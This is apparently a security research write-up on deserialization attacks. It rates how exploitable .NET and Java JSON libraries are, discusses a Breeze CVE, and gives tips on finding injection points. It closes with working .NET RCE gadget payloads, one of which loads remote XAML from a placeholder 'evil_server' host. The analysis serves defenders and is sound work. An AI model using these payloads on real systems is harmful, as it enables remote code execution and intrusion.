### FsPickler

FsPickler is a serialization library designed for efficient object distribution across .NET processes. The library prioritizes performance and broad type support, offering multiple pluggable serialization formats, including XML, JSON, and BSON, as well as a high-performance binary format.

**Security Considerations:**
- **Type Discriminators:** By default, FsPickler includes type discriminators, which can be exploited by attackers to instantiate arbitrary types.
- **Type Graph Inspection:** During deserialization, FsPickler performs an expected type graph inspection, requiring the attacker to find a suitable injection point in the object graph.
- **Deserialization Methods:**
  - Setters
  - Serialization Constructor

**Recommendation:**
- **Untrusted Data:** FsPickler should not be used with untrusted data unless the expected types are simple and payload injection is not possible. However, this approach is not recommended as it requires continuous monitoring of published gadgets.

### Sweet.Jayson

Sweet.Jayson is a fast, reliable, and thread-safe C# JSON library for server-side and desktop operations. It is fully compliant with json.org standards.

**Project Site:** [https://github.com/ocdogan/Sweet.Jayson](https://github.com/ocdogan/Sweet.Jayson)
**NuGet Downloads:** 1,697

**Security Considerations:**
- **Type Discriminators:** By default, Sweet.Jayson includes type discriminators and performs weak type control by deserializing the object first and then casting it to the expected type.
- **Attack Vector:** An attacker can send a payload as the root object in the JSON data.
- **Deserialization Methods:**
  - Setters

**Recommendation:**
- **Untrusted Data:** Sweet.Jayson should never be used with untrusted data as it cannot be configured securely.

### JavascriptSerializer

JavascriptSerializer is a native .NET library that provides serialization and deserialization functionality for AJAX-enabled applications.

**Project Site:** [https://msdn.microsoft.com/en-us/library/system.web.script.serialization.javascriptserializer(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.web.script.serialization.javascriptserializer(v=vs.110).aspx)

**Security Considerations:**
- **Type Discriminators:** By default, it does not include type discriminator information, making it a secure serializer. However, a type resolver can be configured to include this information.
- **Attack Vector:** If a type resolver is used, payloads can be included as the root JSON element.
- **Deserialization Methods:**
  - Setters

**Recommendation:**
- **Secure Use:** JavascriptSerializer can be used securely as long as a type resolver is not used or is configured to only accept whitelisted valid types.

### DataContractJsonSerializer

DataContractJsonSerializer is a native .NET library that serializes objects to JSON and deserializes JSON data to objects. It extends XmlObjectSerializer and is generally considered secure due to its strict type graph inspection.

**Project Site:** [https://msdn.microsoft.com/en-us/library/system.runtime.serialization.json.datacontractjsonserializer(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.runtime.serialization.json.datacontractjsonserializer(v=vs.110).aspx)

**Security Considerations:**
- **Type Control:** DataContractJsonSerializer performs strict type graph inspection and prevents deserialization of non-whitelisted types.
- **Attack Vector:** If an attacker can control the expected type used to configure the deserializer, they can execute arbitrary code.
- **Deserialization Methods:**
  - Setters
  - Serialization Constructors

**Recommendation:**
- **Secure Use:** DataContractJsonSerializer can be used securely as long as the expected type cannot be controlled by users.

### Jackson

Jackson is a popular JSON library for Java, known for its performance and flexibility.

**Project Site:** [https://github.com/FasterXML/jackson](https://github.com/FasterXML/jackson)

**Security Considerations:**
- **Type Information:** By default, Jackson does not include type information in serialized data. However, it can be enabled globally or per field using annotations.
- **Attack Vector:** If type discriminators are enabled, attackers can inject payloads into any member in the expected object graph.
- **Deserialization Methods:**
  - Setters

**Recommendation:**
- **Untrusted Data:** When dealing with untrusted data, avoid enabling type information. If necessary, use the `@JsonTypeInfo` annotation only for required fields and avoid using `JsonTypeInfo.Id.CLASS`.

### Genson

Genson is a Java and Scala JSON conversion library.

**Project Site:** [https://owlike.github.io/genson/](https://owlike.github.io/genson/)

**Security Considerations:**
- **Type Information:** By default, Genson does not include type information, but it can be configured to do so. It also inspects the expected object graph to control deserialization.
- **Attack Vector:** An attacker needs to find an injection field in the object graph.
- **Deserialization Methods:**
  - Setters

**Recommendation:**
- **Untrusted Data:** Genson should never be configured to use runtime types when dealing with untrusted data.

### JSON-IO

JSON-IO is a lightweight JSON parser that includes type information by default and uses reflection to assign field values.

**Project Site:** [https://github.com/jdereg/json-io](https://github.com/jdereg/json-io)

**Security Considerations:**
- **Type Control:** JSON-IO does not implement any type controls other than post-deserialization casting. An attacker can inject a payload as the root JSON element.
- **Attack Vector:** JSON-IO is vulnerable because it calls the `toString()` method on the deserialized class if an exception is raised.
- **Deserialization Methods:**
  - `toString()`

**Recommendation:**
- **Untrusted Data:** JSON-IO should never be used with untrusted data.

### FlexSON

Flexjson is a lightweight library for serializing and deserializing Java objects into and from JSON.

**Project Site:** [http://flexjson.sourceforge.net/](http://flexjson.sourceforge.net/)

**Security Considerations:**
- **Type Discriminators:** By default, Flexjson includes type discriminators and does not implement any type control, making it easily exploitable.
- **Deserialization Methods:**
  - Setters

**Recommendation:**
- **Untrusted Data:** Flexjson should never be used with untrusted data.

### Finding Entry Points in Object Graphs

Some libraries perform type control by inspecting the expected type object graph and allowing only assignable types. Attackers need to find entry points to place payload gadgets. Here are some tips:

- **.NET Non-Generic Collections:** Such as `Hashtable`, `ArrayList`, etc.
- **Object Members:** `java.lang.Object` or `System.Object`
- **Generic Types:** E.g., `Message`

**Expanding the Search Surface:**
- **Derived Types:** Use a derived type of the expected member type.
- **Parent Type Properties:** Use properties of the parent type.

These actions can be done recursively for any type in the expected type graph.

### Example: Breeze (CVE-2017-9424)

Breeze is a .NET data management backend framework that allows developers to write data management endpoints for JavaScript and .NET clients. Communication is done over HTTP/JSON using Json.Net as the parsing library.

**Vulnerability:**
- **Configuration:** The project was configured to use `TypeNameHandling.All`, including .NET type details in the exchanged JSON data.
- **Attack Vector:** An attacker could modify the type information and force the backend to deserialize arbitrary types, calling setters on arbitrary types.
- **Payload Injection:** An attacker injected a payload in the `Tag` property of the `SaveOptions` type.

**Report Timeline:**
- **Reported:** May 29th
- **Fixed:** Version 1.6.5 released on June 1st (just 2 days after reporting).

### Gadgets

The following section summarizes the setter gadgets found and used to attack analyzed libraries.

#### .NET RCE Gadgets

1. **System.Configuration.Install.AssemblyInstaller**
   - **Sample Payload:**
     ```json
     {"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "Path":"file:///c:/somePath/MixedLibrary.dll"}
     ```
   - **Attack Vector:**
     - Execute payload on assembly load using `DllMain()` or a static constructor in a type derived from `System.Configuration.Install.Installer`.
   - **Requirements:**
     - No additional requirements if the payload assembly is local. Remote resources may have additional security checks.

2. **System.Activities.Presentation.WorkflowDesigner**
   - **Sample Payload:**
     ```json
     {"$type":"System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", "PropertyInspectorFontAndColorData":"calc"}
     ```
   - **Attack Vector:**
     - Execute static methods during parsing of XAML payload.
   - **Requirements:**
     - Requires a Single-Threaded-Apartment (STA) thread.

3. **System.Windows.ResourceDictionary**
   - **Sample Payload:**
     ```json
     {"__type":"System.Windows.Application, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", "Resources":{"__type":"System.Windows.ResourceDictionary, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", "Source":"http://evil_server/EvilSite/Xamlpayload"}}
     ```
   - **Attack Vector:**
     - Send a payload with a URL to a controlled server, which responds with a XAML payload and `Content-Type = application/xaml+xml`. The target server will execute the desired static method during XAML parsing.
   - **Requirements:**
     - None specific, but the payload must be properly formatted and served with the correct content type.